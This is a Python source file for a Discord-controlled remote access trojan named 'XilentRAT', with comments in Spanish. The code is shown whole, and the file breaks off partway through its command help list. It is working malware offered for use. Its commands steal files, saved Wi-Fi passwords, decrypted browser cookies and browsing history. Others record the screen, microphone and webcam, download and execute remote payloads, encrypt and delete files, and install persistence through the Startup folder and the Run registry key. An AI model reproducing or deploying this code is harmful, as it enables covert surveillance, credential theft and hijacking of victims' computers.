import discord
import os
import socket
import psutil
import requests
import subprocess
import platform
import pyautogui
import ctypes
import pyaudio
import wave
import base64
import shutil
import json
import win32crypt
import sqlite3
import cv2
import time
import numpy as np
import winreg as reg
import sys
import pyttsx3
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Protocol.KDF import PBKDF2
from datetime import datetime
from Cryptodome.Cipher import AES
from discord.ext import commands


intents = discord.Intents.default()
intents.messages = True
intents.message_content = True 

ENCRYPTION_KEY = b''  
ENCRYPTED_TOKEN = b''
ENCRYPTED_CHANNEL_ID = b''

def decrypt_data(encrypted_data: bytes, encryption_key: bytes) -> str:
    try:
        cipher = Fernet(encryption_key)
        return cipher.decrypt(encrypted_data).decode()
    except Exception as e:
        print(f"Error al desencriptar: {e}")
        exit(1)

TOKEN = decrypt_data(ENCRYPTED_TOKEN, ENCRYPTION_KEY)
CHANNEL_ID = int(decrypt_data(ENCRYPTED_CHANNEL_ID, ENCRYPTION_KEY)) 

usuario_actual = os.getlogin()
ALLOWED_EXTENSIONS = {'.txt', '.py', '.png', '.jpg', '.docx', '.pdf', '.csv'}

HISTORY_PATHS = {
    "Chrome": f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
    "Brave": f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History",
    "Opera": f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Opera Software\\Opera Stable\\History",
    "Edge": f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
    "Chromium": f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Chromium\\User Data\\Default\\History",
    "Firefox": f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
}

##########################
engine = pyttsx3.init()
engine.setProperty("rate", 110)  # Reducir velocidad para una voz más grave
engine.setProperty("volume", 1.0)  # Volumen al máximo

voices = engine.getProperty("voices")
for voice in voices:
    if "spanish" in voice.id.lower() or "español" in voice.id.lower():
        engine.setProperty("voice", voice.id)
        break
##########################

def derive_key(password: str, salt: bytes):
    return PBKDF2(password, salt, dkLen=32, count=1000000)  # AES-256

# Función para encriptar archivos
def encrypt_file(file_path, password):
    if not os.path.exists(file_path):
        return False, "Archivo no encontrado."

    try:
        salt = get_random_bytes(16)  
        key = derive_key(password, salt)  
        iv = get_random_bytes(16)  
        cipher = AES.new(key, AES.MODE_CBC, iv)

        with open(file_path, 'rb') as f:
            plaintext = f.read()

        padding_length = 16 - (len(plaintext) % 16)
        padded_plaintext = plaintext + bytes([padding_length]) * padding_length

        ciphertext = cipher.encrypt(padded_plaintext)

        encrypted_file = file_path + ".enc"
        with open(encrypted_file, 'wb') as f:
            f.write(salt + iv + ciphertext)  

        os.remove(file_path)  
        return True, encrypted_file

    except Exception as e:
        return False, str(e)

# Función para desencriptar archivos
def decrypt_file(file_path, password):
    if not os.path.exists(file_path):
        return False, "Archivo no encontrado."

    try:
        with open(file_path, 'rb') as f:
            data = f.read()

        salt, iv, ciphertext = data[:16], data[16:32], data[32:]
        key = derive_key(password, salt)
        cipher = AES.new(key, AES.MODE_CBC, iv)

        decrypted_data = cipher.decrypt(ciphertext)

        padding_length = decrypted_data[-1]
        plaintext = decrypted_data[:-padding_length]

        original_file = file_path.replace(".enc", "")
        with open(original_file, 'wb') as f:
            f.write(plaintext)

        os.remove(file_path)  
        return True, original_file

    except Exception as e:
        return False, str(e)

##########################

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_connect():
    usuario_actual = os.getlogin()
    print(f'Conectado como {bot.user}')
    await bot.wait_until_ready()  
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(f"Usuario **{usuario_actual}** conectado")
    else:
        print("No se pudo encontrar el canal.")

@bot.event
async def on_ready():
    print(f'Conectado como {bot.user}')

@bot.command()
async def upload(ctx, path: str = None):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return

    if path is None:
        path = f"C:\\Users\\{os.getlogin()}\\Desktop"
    
    try:
        if not os.path.exists(path):
            await ctx.send(f"La ruta especificada no existe: {path}")
            return
        
        files = os.listdir(path)
        if not files:
            await ctx.send("No hay archivos para subir.")
            return
        
        discord_files = []
        for filename in files:
            file_path = os.path.join(path, filename)
            if os.path.isfile(file_path) and os.path.splitext(filename)[1] in ALLOWED_EXTENSIONS:
                discord_files.append(discord.File(file_path, filename))
        
        if discord_files:
            await ctx.send(files=discord_files)
            print(f'Se han subido {len(discord_files)} archivos con éxito.')
        else:
            await ctx.send("No hay archivos válidos para subir en la carpeta.")
    
    except Exception as e:
        await ctx.send(f"Error al leer los archivos en la carpeta: {e}")

@bot.command()
@commands.has_permissions(manage_messages=True)  
async def clear(ctx, amount: int):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return
    if amount < 1:
        await ctx.send("Por favor, ingresa un número mayor que 0.")
        return
    deleted = await ctx.channel.purge(limit=amount + 1)  
    await ctx.send(f'Eliminados {len(deleted)-1} mensajes.', delete_after=5)

@bot.command()
async def msg(ctx, *, text: str):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("No tienes permiso para usar este comando.")
        return

    ctypes.windll.user32.MessageBoxW(0, text, "XilentRAT", 1)
    await ctx.send("✅ Mensaje enviado.")


@bot.command()
async def voice(ctx, *, text: str):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("No tienes permiso para usar este comando.")
        return

    engine.say(text)
    engine.runAndWait()
    await ctx.send(":speaker: **Mensaje de voz enviado.**")

@bot.command()
async def system(ctx):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return
    try:
        os_name = platform.system()
        os_version = platform.version()
        os_release = platform.release()
        architecture = platform.architecture()[0]
        username = os.getlogin()
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        public_ip = requests.get('https://api64.ipify.org').text
        cpu_usage = psutil.cpu_percent(interval=1)
        total_ram = round(psutil.virtual_memory().total / (1024 ** 3), 2)
        used_ram = round(psutil.virtual_memory().used / (1024 ** 3), 2)
        available_ram = round(psutil.virtual_memory().available / (1024 ** 3), 2)
        disk_info = psutil.disk_usage('/')
        total_disk = round(disk_info.total / (1024 ** 3), 2)
        used_disk = round(disk_info.used / (1024 ** 3), 2)
        free_disk = round(disk_info.free / (1024 ** 3), 2)
        system_info = (
            f"**Información del Sistema:**\n"
            f"Sistema Operativo: {os_name} {os_release}\n"
            f"Versión: {os_version}\n"
            f"Arquitectura: {architecture}\n"
            f"Usuario Actual: {username}\n\n"
            f"**Red:**\n"
            f"Hostname: {hostname}\n"
            f"IP Local: {local_ip}\n"
            f"IP Pública: {public_ip}\n\n"
            f"**Uso de Recursos:**\n"
            f"CPU: {cpu_usage}%\n"
            f"RAM Total: {total_ram} GB\n"
            f"RAM Usada: {used_ram} GB\n"
            f"RAM Disponible: {available_ram} GB\n\n"
            f"**Espacio en Disco:**\n"
            f"Total: {total_disk} GB\n"
            f"Usado: {used_disk} GB\n"
            f"Libre: {free_disk} GB\n"
        )
        await ctx.send(system_info)
    except Exception as e:
        await ctx.send(f"Error al obtener la información del sistema: {e}")

@bot.command()
async def wifi(ctx):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return
    try:
        netsh_result = subprocess.check_output("netsh wlan show profile name=* key=clear", shell=True, text=True)

        file_path = 'netsh_wifi_info.txt'
        
        with open(file_path, 'w') as file:
            file.write(netsh_result)

        await ctx.send("Credenciales de redes guardadas:", file=discord.File(file_path))

        os.remove(file_path)

    except subprocess.CalledProcessError as e:
        await ctx.send(f"Error al ejecutar el comando netsh: {e}")
    except Exception as e:
        await ctx.send(f"Se produjo un error: {e}")

@bot.command()
async def taskmanager(ctx):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'status']):
            processes.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}, User: {proc.info['username']}, Status: {proc.info['status']}")

        task_manager_info = "\n".join(processes)

        file_path = 'task_manager_info.txt'
        
        with open(file_path, 'w') as file:
            file.write(task_manager_info)

        await ctx.send("Lista con procesos en ejecución:", file=discord.File(file_path))

        os.remove(file_path)

    except Exception as e:
        await ctx.send(f"Se produjo un error al obtener la información de los procesos: {e}")

@bot.command()
async def hardware(ctx):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return
    try:
        system_info = (
            f"**Información del Sistema:**\n"
            f"Sistema Operativo: {platform.system()} {platform.release()}\n"
            f"Versión: {platform.version()}\n"
            f"Arquitectura: {platform.architecture()[0]}\n\n"
        )

        cpu_info = (
            f"**Información de la CPU:**\n"
            f"Modelo: {platform.processor()}\n"
            f"Uso de la CPU: {psutil.cpu_percent(interval=1)}%\n"
            f"Núcleos Físicos: {psutil.cpu_count(logical=False)}\n"
            f"Núcleos Lógicos: {psutil.cpu_count(logical=True)}\n\n"
        )

        virtual_memory = psutil.virtual_memory()
        ram_info = (
            f"**Información de la RAM:**\n"
            f"RAM Total: {round(virtual_memory.total / (1024 ** 3), 2)} GB\n"
            f"RAM Usada: {round(virtual_memory.used / (1024 ** 3), 2)} GB\n"
            f"RAM Disponible: {round(virtual_memory.available / (1024 ** 3), 2)} GB\n"
            f"Uso de la RAM: {virtual_memory.percent}%\n\n"
        )

        disk_info = psutil.disk_partitions()
        disk_details = ""
        for disk in disk_info:
            disk_usage = psutil.disk_usage(disk.mountpoint)
            disk_details += (
                f"Disco: {disk.device}\n"
                f"Tipo: {disk.fstype}\n"
                f"Uso: {disk_usage.percent}%\n"
                f"Total: {round(disk_usage.total / (1024 ** 3), 2)} GB\n"
                f"Usado: {round(disk_usage.used / (1024 ** 3), 2)} GB\n"
                f"Libre: {round(disk_usage.free / (1024 ** 3), 2)} GB\n\n"
            )

        try:
            gpu_info = subprocess.check_output("wmic path win32_videocontroller get caption", shell=True, text=True)
            gpu_info = gpu_info.strip().split("\n")[1:]  
            gpu_info = "\n".join(gpu_info) if gpu_info else "No se encontró GPU."
        except Exception:
            gpu_info = "No se pudo obtener información de la GPU."

        hardware_info = system_info + cpu_info + ram_info + disk_details + f"**GPU:**\n{gpu_info}"

        file_path = 'hardware_info.txt'
        with open(file_path, 'w') as file:
            file.write(hardware_info)

        await ctx.send("Información del hardware:", file=discord.File(file_path))

        os.remove(file_path)

    except Exception as e:
        await ctx.send(f"Se produjo un error al obtener la información del hardware: {e}")


@bot.command()
async def screenshot(ctx):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = f"screenshot_{timestamp}.png"
        
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)  

        await ctx.send("Captura de pantalla:", file=discord.File(screenshot_path))

        os.remove(screenshot_path)

    except Exception as e:
        await ctx.send(f"Se produjo un error al tomar la captura de pantalla: {e}")

@bot.command()
async def microphone(ctx):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return

    try:
        FORMAT = pyaudio.paInt16 
        CHANNELS = 1  
        RATE = 44100 
        CHUNK = 1024  
        RECORD_SECONDS = 10  
        FILENAME = f"audio_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.wav"  

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT, channels=CHANNELS,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)

        print("Grabando audio...")
        frames = []

        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        print("Grabación terminada.")
        stream.stop_stream()
        stream.close()
        p.terminate()

        with wave.open(FILENAME, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))

        await ctx.send("Audio grabado:", file=discord.File(FILENAME))

        os.remove(FILENAME)

    except Exception as e:
        await ctx.send(f"Se produjo un error al grabar el audio: {e}")

@bot.command()
async def downloader(ctx, url: str):
    try:
        temp_folder = "C:\\Windows\\Temp"
        file_name = url.split("/")[-1]  
        save_path = os.path.join(temp_folder, file_name)

        response = requests.get(url, stream=True)
        if response.status_code == 200:
            with open(save_path, "wb") as file:
                for chunk in response.iter_content(1024):
                    file.write(chunk)

            await ctx.send(f"✅ Descarga finalizada: `{save_path}`")
        else:
            await ctx.send("❌ Error al descargar el archivo.")

    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")

@bot.command()
async def execute(ctx, path: str):
    try:
        if os.path.isfile(path):  
            subprocess.Popen(path, shell=True)  
            await ctx.send(f"✅ Ejecutando: `{path}`")
        else:
            await ctx.send("❌ Error: La ruta especificada no es válida o el archivo no existe.")
    except Exception as e:
        await ctx.send(f"⚠️ Error al ejecutar: {e}")


@bot.command()
async def remove(ctx, path: str):
    try:
        if os.path.isfile(path):  
            os.remove(path)  
            await ctx.send(f"🗑️ Archivo eliminado: `{path}`")
        else:
            await ctx.send("❌ Error: La ruta especificada no es válida o el archivo no existe.")
    except Exception as e:
        await ctx.send(f"⚠️ Error al eliminar: {e}")

@bot.command()
async def recordscreen(ctx):
    await ctx.send("🎥 Iniciando grabación de pantalla por 10 segundos...")

    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    output_path = "C:\\Windows\\Temp\\screen_record.avi"
    out = cv2.VideoWriter(output_path, fourcc, 10.0, screen_size)

    start_time = time.time()
    while time.time() - start_time < 10:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        out.write(frame)

    out.release()
    await ctx.send("✅ Grabación finalizada. Enviando archivo...")

    if os.path.exists(output_path):
        await ctx.send(file=discord.File(output_path))
        os.remove(output_path)
    else:
        await ctx.send("❌ Error al generar el video.")

@bot.command()
async def reboot(ctx):
    await ctx.send("🔄 Reiniciando el sistema...")
    os.system("shutdown /r /t 0")

@bot.command()
async def poweroff(ctx):
    await ctx.send("⚡ Apagando el sistema...")
    os.system("shutdown /s /t 0")

@bot.command()
async def dir(ctx, ruta: str):
    if not os.path.exists(ruta):
        await ctx.send(f"❌ La ruta especificada no existe: `{ruta}`")
        return
    
    archivos = os.listdir(ruta)
    if not archivos:
        await ctx.send(f"📂 La carpeta está vacía: `{ruta}`")
        return

    respuesta = f"📁 Contenido de `{ruta}`:\n" + "\n".join(archivos[:50])  # Muestra hasta 50 archivos
    await ctx.send(f"```{respuesta}```")

@bot.command()
async def webcam(ctx):
    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            await ctx.send("❌ No se pudo acceder a la webcam.")
            return
        
        ret, frame = cam.read()
        cam.release()

        if not ret:
            await ctx.send("❌ Error al capturar la imagen.")
            return

        image_path = "C:\\Windows\\Temp\\captura.jpg"
        cv2.imwrite(image_path, frame)
        
        with open(image_path, "rb") as file:
            await ctx.send("📸 Captura de la webcam:", file=discord.File(file, "captura.jpg"))

        os.remove(image_path)

    except Exception as e:
        await ctx.send(f"❌ Error al capturar la imagen: {str(e)}")
#####
def get_chrome_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_cookie(cookie_encrypted, key):
    try:
        iv = cookie_encrypted[3:15]  
        cookie_encrypted = cookie_encrypted[15:]  
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(cookie_encrypted).decode("utf-8")
    except Exception:
        return win32crypt.CryptUnprotectData(cookie_encrypted, None, None, None, 0)[1].decode("utf-8")

def get_cookies(browser_name, browser_path):
    cookies_file = os.path.join(browser_path, "Default", "Network", "Cookies")
    if not os.path.exists(cookies_file):
        return f"❌ No se encontraron cookies para {browser_name}."

    temp_db = "C:\\Windows\\Temp\\cookies_temp.db"

    try:
        shutil.copy2(cookies_file, temp_db)
    except PermissionError:
        return f"🚫 No se pudo copiar la base de datos de cookies de {browser_name}. Asegúrate de que el navegador esté cerrado."

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        key = get_chrome_key(browser_path)
        cookies = [f"== {browser_name} =="]

        for host, name, enc_value in cursor.fetchall():
            decrypted_value = decrypt_cookie(enc_value, key)
            cookies.append(f"{host}\t{name}\t{decrypted_value}")

        conn.close()
        os.remove(temp_db)
        return "\n".join(cookies)
    except Exception as e:
        return f"Error extrayendo cookies de {browser_name}: {str(e)}"

@bot.command()
async def cookies(ctx):
    user = os.getlogin()
    browsers = {
        "Brave": f"C:\\Users\\{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
        "Chrome": f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data",
        "Edge": f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data",
        "Opera": f"C:\\Users\\{user}\\AppData\\Roaming\\Opera Software\\Opera Stable",
    }

    cookies_data = []
    for browser, path in browsers.items():
        cookies_data.append(get_cookies(browser, path))

    cookies_path = "C:\\Windows\\Temp\\cookies.txt"
    with open(cookies_path, "w", encoding="utf-8") as f:
        f.write("\n\n".join(cookies_data))

    with open(cookies_path, "rb") as file:
        await ctx.send("🍪 Aquí están las cookies extraídas:", file=discord.File(file, "cookies.txt"))

    os.remove(cookies_path)

@bot.command()
async def open_url(ctx, url: str):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return
    try:
        if os.name == 'nt':  # Si es Windows
            subprocess.run(["start", url], shell=True)
        else:  # Para Linux/macOS
            subprocess.run(["xdg-open", url])
        await ctx.send(f"Se ha abierto la URL: {url}")
    except Exception as e:
        await ctx.send(f"Error al abrir la URL: {e}")

@bot.command()
async def setpersistence(ctx):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return
    
    try:
        # Ruta del archivo ejecutable
        rat_path = sys.argv[0]  
        rat_name = os.path.basename(rat_path)

        # Ruta de la carpeta de inicio (para que se ejecute al iniciar sesión)
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

        # Copiar el archivo RAT a la carpeta de inicio
        shutil.copy(rat_path, os.path.join(startup_folder, rat_name))
        
        # Crear una entrada en el registro para ejecución persistente
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(reg_key, rat_name, 0, reg.REG_SZ, rat_path)
        reg.CloseKey(reg_key)
        
        await ctx.send(f"El RAT se ha configurado para ejecución persistente en el inicio.")
    except Exception as e:
        await ctx.send(f"Error al establecer persistencia: {e}")

@bot.command()
async def kill_process(ctx, *, process_name: str):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return

    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if process_name.lower() in proc.info['name'].lower():
                proc.kill()  
                await ctx.send(f"El proceso {proc.info['name']} con PID {proc.info['pid']} ha sido finalizado.")
                return

        await ctx.send(f"No se encontró ningún proceso con el nombre {process_name}.")
    
    except Exception as e:
        await ctx.send(f"Error al intentar matar el proceso: {e}")

@bot.command()
async def history(ctx):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return

    extracted_files = []

    for browser, path in HISTORY_PATHS.items():
        try:
            if "Firefox" in browser:
                if not os.path.exists(path):
                    continue
                for profile in os.listdir(path):
                    profile_path = os.path.join(path, profile, "places.sqlite")
                    if os.path.exists(profile_path):
                        history_db = profile_path
                        break
                else:
                    continue
            else:
                history_db = path

            if not os.path.exists(history_db):
                continue

            temp_db = f"history_{browser}.db"
            shutil.copy2(history_db, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            try:
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20")
                history_data = cursor.fetchall()
                conn.close()
            except sqlite3.OperationalError:
                conn.close()
                os.remove(temp_db)
                continue

            if not history_data:
                os.remove(temp_db)
                continue

            safe_browser_name = browser.replace(" ", "_").replace(":", "").replace("/", "").replace("\\", "")
            file_path = f"historial_{safe_browser_name}.txt"

            with open(file_path, "w", encoding="utf-8") as file:
                file.write(f"Historial de {browser}\n")
                file.write("=" * 40 + "\n\n")
                for url, title, timestamp in history_data:
                    try:
                        timestamp = datetime.fromtimestamp(timestamp / 1000000 - 11644473600)  # Conversión segura
                        file.write(f"Título: {title}\nURL: {url}\nFecha: {timestamp}\n\n")
                    except (OSError, ValueError):
                        file.write(f"Título: {title}\nURL: {url}\nFecha: ERROR AL CONVERTIR TIMESTAMP\n\n")

            extracted_files.append(file_path)
            os.remove(temp_db)

        except Exception as e:
            await ctx.send(f"Error con {browser}: {str(e)}")

    if not extracted_files:
        await ctx.send("No se encontró historial en ningún navegador.")
        return

    for file in extracted_files:
        await ctx.send(f"Historial de {file.split('_')[1].split('.')[0]}:", file=discord.File(file))
        os.remove(file)

@bot.command()
async def exit(ctx):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return
    await ctx.send("Conexión finalizada.")  
    await bot.close()  

def run_bot():
    bot.run(TOKEN)

@bot.command()
async def encrypt(ctx, file_path: str, password: str):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("❌ No tienes permiso para ejecutar este comando aquí.")
        return

    success, result = encrypt_file(file_path, password)

    if success:
        await ctx.send(f"🔒 Archivo cifrado exitosamente: `{result}`")
    else:
        await ctx.send(f"❌ Error al cifrar el archivo: `{result}`")


@bot.command()
async def decrypt(ctx, file_path: str, password: str):
    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("❌ No tienes permiso para ejecutar este comando aquí.")
        return

    success, result = decrypt_file(file_path, password)

    if success:
        await ctx.send(f"🔓 Archivo descifrado exitosamente: `{result}`")
    else:
        await ctx.send(f"❌ Error al descifrar el archivo: `{result}`")

@bot.command()
async def lock(ctx):
    await ctx.send("🔒 Sesión bloqueada.")
    subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)

@bot.command()
async def move(ctx, x: int, y: int):
    pyautogui.moveTo(x, y)
    await ctx.send(f":white_check_mark: Ratón movido a ({x}, {y})")

@bot.command()
async def click(ctx):
    pyautogui.click()
    await ctx.send(":white_check_mark: Se hizo clic en la posición actual.")

@bot.command()
async def type(ctx, *, text: str):
    pyautogui.write(text, interval=0.1)
    await ctx.send(f":white_check_mark: Se escribió: `{text}`")

@bot.command()
async def lookup(ctx):
    try:
        ip_response = requests.get("https://api64.ipify.org?format=json")
        ip_data = ip_response.json()
        ip_publica = ip_data.get("ip", "No disponible")

        geo_response = requests.get(f"http://ip-api.com/json/{ip_publica}")
        geo_data = geo_response.json()

        if geo_data["status"] == "success":
            lat = geo_data["lat"]
            lon = geo_data["lon"]
            location_url = f"https://www.google.com/maps?q={lat},{lon}"

            await ctx.send(
                f"🌍 **Información del Sistema**\n"
                f"🖥 **IP Pública:** `{ip_publica}`\n\n"
                f"📍 **Ubicación Aproximada:**\n"
                f"🔹 **Latitud:** {lat}\n"
                f"🔹 **Longitud:** {lon}\n"
                f"🔗 [Ver en Google Maps]({location_url})"
            )
        else:
            await ctx.send("❌ No se pudo obtener la ubicación.")

    except Exception as e:
        await ctx.send(f"❌ Error al obtener la información: {e}")

@bot.command()
async def whoami(ctx):
    usuario_actual = os.getlogin()
    await ctx.send(f"👤 **Usuario actual:** `{usuario_actual}`")

@bot.command()
async def listusers(ctx):
    try:
        if os.name == "nt":  # Windows
            output = subprocess.check_output("wmic useraccount get name", shell=True).decode()
            users = [line.strip() for line in output.split("\n")[1:] if line.strip()]
        else:  # Linux/macOS
            output = subprocess.check_output("cut -d: -f1 /etc/passwd", shell=True).decode()
            users = output.split("\n")

        if users:
            users_list = "\n".join(f"🔹 {user}" for user in users)
            await ctx.send(f"👥 **Usuarios del sistema:**\n{users_list}")
        else:
            await ctx.send("❌ No se encontraron usuarios.")

    except Exception as e:
        await ctx.send(f"❌ Error al listar los usuarios: {e}")

@bot.command()
async def wallpaper(ctx, url: str):
    try:
        response = requests.get(url)
        image_data = response.content

        # Guardar la imagen temporalmente
        temp_path = "wallpaper_temp.jpg"
        with open(temp_path, "wb") as file:
            file.write(image_data)

        if os.name == "nt":
            SPI_SETDESKWALLPAPER = 20
            WALLPAPER_PATH = os.path.abspath(temp_path)

            result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)
            if result:
                await ctx.send(f"🌆 **Fondo de pantalla cambiado exitosamente.**")
            else:
                await ctx.send("❌ No se pudo cambiar el fondo de pantalla.")
        else:
            await ctx.send("❌ Este comando solo funciona en Windows.")
    except Exception as e:
        await ctx.send(f"❌ Error al cambiar el fondo de pantalla: {e}")

@bot.command()
async def volume(ctx):
    try:
        if os.name == "nt":  # Windows
            volume_info = subprocess.check_output("nircmd.exe getvolume", shell=True).decode()
            volume_level = int(volume_info.strip().split(":")[1])
            await ctx.send(f"🔊 **Volumen actual:** {volume_level}%")
        else:
            await ctx.send("❌ Este comando solo funciona en Windows.")
    except Exception as e:
        await ctx.send(f"❌ Error al obtener el volumen: {e}")

@bot.command()
async def brightness(ctx, level: int):
    try:
        if level < 0 or level > 100:
            await ctx.send("❌ El nivel de brillo debe estar entre 0 y 100.")
            return
        
        if os.name == "nt":  # Windows
            subprocess.run(["powershell", f"Get-WmiObject -Namespace root/wmi -Class WmiMonitorBrightnessMethods | ForEach-Object {{ $_.WmiSetBrightness(1, {level}) }}"])
            await ctx.send(f"🌞 **Brillo ajustado a {level}%**")
        else:
            await ctx.send("❌ Este comando solo funciona en Windows.")
    except Exception as e:
        await ctx.send(f"❌ Error al ajustar el brillo: {e}")

@bot.command()
async def mv(ctx, src: str, dest: str):
    try:
        if not os.path.exists(src):
            await ctx.send(f"❌ El archivo de origen no existe: `{src}`")
            return

        if os.path.isdir(dest):
            dest = os.path.join(dest, os.path.basename(src))

        shutil.move(src, dest)

        await ctx.send(f"✅ Archivo movido exitosamente:\n📂 **De:** `{src}`\n📂 **A:** `{dest}`")
    except Exception as e:
        await ctx.send(f"❌ Error al mover el archivo: {e}")

@bot.command()
async def rename(ctx, file_path: str, new_name: str):
    try:
        
        if not os.path.exists(file_path):
            await ctx.send(f"❌ El archivo especificado no existe: `{file_path}`")
            return

        directory = os.path.dirname(file_path)
        new_path = os.path.join(directory, new_name)

        os.rename(file_path, new_path)

        await ctx.send(f"✅ Archivo renombrado exitosamente:\n📂 **De:** `{file_path}`\n📂 **A:** `{new_path}`")
    except Exception as e:
        await ctx.send(f"❌ Error al renombrar el archivo: {e}")

@bot.command()
async def mkdir(ctx, path: str):
    try:
        os.makedirs(path, exist_ok=True)
        await ctx.send(f"📂 Carpeta creada con éxito: `{path}`")
    except Exception as e:
        await ctx.send(f"❌ Error al crear la carpeta: {e}")

@bot.command()
async def commands(ctx):
    if ctx.channel.id != CHANNEL_ID:  # Opcional: para restringir el comando a un canal específico
        await ctx.send("Este comando solo se puede usar en el canal designado.")
        return
    
    comandos = [
        "📂 Gestión de Archivos",
        "!upload [ruta] → Extraer archivos confidenciales del sistema infectado. Ejemplo: !upload C:\\Users\\usuario\\Desktop",
        "!clear → Eliminar el chat de Discord.",
        "!exit → Finalizar conexión.",
        "!msg [mensaje] → Enviar un mensaje emergente al usuario.",
        "!voice [mensaje] → Enviar un mensaje de voz y reproducirlo en el sistema.",
        "!system → Obtener información del sistema comprometido.",
        "!wifi → Obtener credenciales Wi-Fi guardadas.",
        "!taskmanager → Obtener lista de procesos en ejecución en tiempo real.",
        "!hardware → Obtener información del hardware del equipo.",
        "!screenshot → Toma captura de pantalla del sistema infectado.",
        "!microphone → Graba el micrófono del usuario por 10 segundos y lo envía al atacante.",
        "!downloader [url] → Descarga archivos remotos desde el sistema infectado. Ejemplo: !downloader https://myfile.com/backdoor.php",
        "!execute [ruta] → Ejecuta cualquier archivo que se encuentre en el sistema. Ejemplo: !execute C:\\Users\\usuario\\Downloads\\backdoor.php",
        "!remove [ruta] → Elimina cualquier archivo que se encuentre en el sistema. Ejemplo: !remove C:\\Users\\usuario\\Downloads\\backdoor.php",
        "!recordscreen → Graba la pantalla del usuario por 10 segundos y lo envía al atacante.",
        "!reboot → Reinicia el sistema.",
        "!poweroff → Apaga el sistema.",
        "!dir [ruta] → Enumera archivos del directorio especificado. Ejemplo: !dir C:\\Users\\usuario\\Desktop",
        "!webcam → Toma una fotografía de la webcam del usuario y lo envía al atacante.",
        "!cookies → Roba las cookies de los navegadores del usuario. Se necesita permisos de administrador para este comando.",
        "!history → Obtener historial de los navegadores del usuario.",
        "!open_url [url] → Abre una página web en el navegador del usuario. Ejemplo: !open_url https://malicioso.com",
        "!setpersistence → Establece persistencia en el sistema para que se ejecute al iniciar sesión.",
